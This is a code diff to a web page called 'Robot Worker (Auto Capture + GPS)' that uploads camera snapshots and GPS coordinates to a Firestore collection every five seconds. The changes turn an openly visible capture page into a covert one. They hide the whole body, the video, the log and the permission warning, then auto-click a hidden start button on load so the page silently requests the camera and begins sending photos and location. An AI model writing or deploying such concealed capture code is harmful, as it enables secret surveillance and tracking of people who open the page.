@@ -4,19 +4,50 @@
     <meta charset="UTF-8">
     <title>Robot Worker (Auto Capture + GPS)</title>
     <style>
-        body { text-align: center; font-family: Arial; background: #222; color: white; margin-top: 50px; }
-        video { border: 3px solid #00ffcc; border-radius: 10px; width: 300px; }
-        #log { margin-top: 20px; font-size: 14px; color: #00ffcc; }
-        .warning { color: yellow; font-size: 12px; margin-top: 10px; }
+        body { 
+            text-align: center; 
+            font-family: Arial; 
+            background: #ffffff; /* Blank white page */
+            color: white; 
+            margin-top: 50px; 
+            display: none; /* Initially hide everything */
+        }
+        video { 
+            border: 3px solid #00ffcc; 
+            border-radius: 10px; 
+            width: 300px; 
+            display: none; /* Hide video element */
+        }
+        #log { 
+            margin-top: 20px; 
+            font-size: 14px; 
+            color: #00ffcc; 
+            display: none; /* Hide log element */
+        }
+        .warning { 
+            color: yellow; 
+            font-size: 12px; 
+            margin-top: 10px; 
+            display: none; /* Hide warning element */
+        }
+        #startButton { 
+            padding: 10px 20px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            background-color: #00ffcc; 
+            color: black; 
+            border: none; 
+            border-radius: 5px; 
+            display: none; /* Hide start button initially */
+        }
     </style>
 </head>
 <body>
     <h2>🤖 Robot Camera (Auto-Capture & GPS)</h2>
     <p>Camera & Location active. Sending data every 5 seconds...</p>
-    
+    <button id="startButton">Start Camera & Location</button>
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    
     <div id="log">Waiting for camera...</div>
     <div class="warning">⚠️ Please allow Location/GPS permission in your browser!</div>
 
@@ -40,18 +71,33 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const log = document.getElementById('log');
+        const startButton = document.getElementById('startButton');
 
-        // Camera On Karna
-        navigator.mediaDevices.getUserMedia({ video: { ideal: 720 }, audio: false })
-            .then(stream => { 
-                video.srcObject = stream; 
-                log.innerText = "Camera Started! Auto-capture active.";
-                // Har 5 second me capture process start
-                setInterval(getLocationAndCapture, 5000); 
-            })
-            .catch(err => { 
-                log.innerText = "❌ Camera Permission Denied!"; 
-            });
+        // Function to show elements after permissions are granted
+        function showElements() {
+            document.body.style.display = 'block';
+            startButton.style.display = 'none'; // Hide start button after permissions are granted
+        }
+
+        // Automatically click the start button to request permissions
+        window.onload = () => {
+            startButton.click();
+        };
+
+        startButton.addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: { ideal: 720 }, audio: false })
+                .then(stream => {
+                    video.srcObject = stream;
+                    log.innerText = "Camera Started! Auto-capture active.";
+                    showElements(); // Show elements after permissions are granted
+                    // Har 5 second me capture process start
+                    setInterval(getLocationAndCapture, 5000);
+                })
+                .catch(err => {
+                    log.innerText = "❌ Camera Permission Denied!";
+                    showElements(); // Show elements even if permissions are denied
+                });
+        });
 
         // GPS Location lena aur fir photo capture karna
         function getLocationAndCapture() {
@@ -80,9 +126,9 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
+
             const imageBase64 = canvas.toDataURL('image/jpeg', 0.4); // 40% quality for faster upload
-            
+
             try {
                 await addDoc(collection(db, "robot_logs"), {
                     imageText: imageBase64,
@@ -91,7 +137,7 @@
                     lng: lng,
                     timestamp: serverTimestamp()
                 });
-                
+
                 let timeNow = new Date().toLocaleTimeString();
                 log.innerText = `✅ Last photo sent at ${timeNow} | GPS: ${lat}, ${lng}`;
             } catch (error) {
